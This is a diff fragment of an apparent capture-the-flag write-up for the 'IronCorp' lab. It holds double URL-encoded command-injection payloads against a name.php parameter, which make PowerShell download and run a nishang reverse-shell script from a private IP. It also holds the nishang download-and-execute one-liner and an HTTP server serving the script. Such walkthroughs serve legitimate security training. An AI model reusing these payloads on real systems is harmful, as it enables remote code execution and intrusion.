-http://internal.ironcorp.me:11025/name.php?name=hi|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%32%25%33%30%25%33%31%25%32%65%25%33%32%25%33%38%25%32%65%25%33%37%25%33%38%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39
+http://internal.ironcorp.me:11025/name.php?name=hello|%25%37%30%...%33%31%25%32%37%25%32%39
 ```
 
 ```bash
-/?r=http://internal.ironcorp.me:11025/name.php?name=test|%25%37%30%25%36%66%25%37%37%25%36%35%25%37%32%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%36%35%25%37%38%25%36%35%25%32%30%25%32%64%25%36%33%25%32%30%25%36%39%25%36%35%25%37%38%25%32%38%25%36%65%25%36%35%25%37%37%25%32%64%25%36%66%25%36%32%25%36%61%25%36%35%25%36%33%25%37%34%25%32%30%25%36%65%25%36%35%25%37%34%25%32%65%25%37%37%25%36%35%25%36%32%25%36%33%25%36%63%25%36%39%25%36%35%25%36%65%25%37%34%25%32%39%25%32%65%25%36%34%25%36%66%25%37%37%25%36%65%25%36%63%25%36%66%25%36%31%25%36%34%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%38%25%32%37%25%36%38%25%37%34%25%37%34%25%37%30%25%33%61%25%32%66%25%32%66%25%33%31%25%33%30%25%32%65%25%33%38%25%32%65%25%33%31%25%33%30%25%33%36%25%32%65%25%33%32%25%33%32%25%33%32%25%32%66%25%34%39%25%36%65%25%37%36%25%36%66%25%36%62%25%36%35%25%32%64%25%35%30%25%36%66%25%37%37%25%36%35%25%37%32%25%35%33%25%36%38%25%36%35%25%36%63%25%36%63%25%35%34%25%36%33%25%37%30%25%32%65%25%37%30%25%37%33%25%33%31%25%32%37%25%32%39
+/?r=http://internal.ironcorp.me:11025/name.php?name=hello|%25%37%30%...%33%31%25%32%37%25%32%39
 ```
 
 <h3 align="center">Invoke-Powershell</h3>
@@ -962,29 +950,3 @@ http://internal.ironcorp.me:11025/name.php?name=hi|%25%37%30%25%36%66%25%37%37%2
 
 <br>
 <br>
-
-
-
-```bash
-:~/IronCorp/nishang/Shells# nano Invoke-PowerShellTcp.ps1
-```
-
-```bash
-:~/IronCorp/nishang/Shells# powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
-```
-
-<img width="1193" height="356" alt="image" src="https://github.com/user-attachments/assets/10c21602-5c84-49da-aafe-f70865d92a02" />
-
-<br>
-<br>
-
-```bash
-:~/IronCorp/nishang/Shells# ls
-Invoke-ConPtyShell.ps1  Invoke-PoshRatHttp.ps1     Invoke-PowerShellTcpOneLineBind.ps1  Invoke-PowerShellUdpOneLine.ps1  Invoke-PsGcatAgent.ps1
-Invoke-JSRatRegsvr.ps1  Invoke-PoshRatHttps.ps1    Invoke-PowerShellTcpOneLine.ps1      Invoke-PowerShellUdp.ps1         Invoke-PsGcat.ps1
-Invoke-JSRatRundll.ps1  Invoke-PowerShellIcmp.ps1  Invoke-PowerShellTcp.ps1             Invoke-PowerShellWmi.ps1         Remove-PoshRat.ps1
-:~/IronCorp/nishang/Shells# python3 -m http.server
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-
-
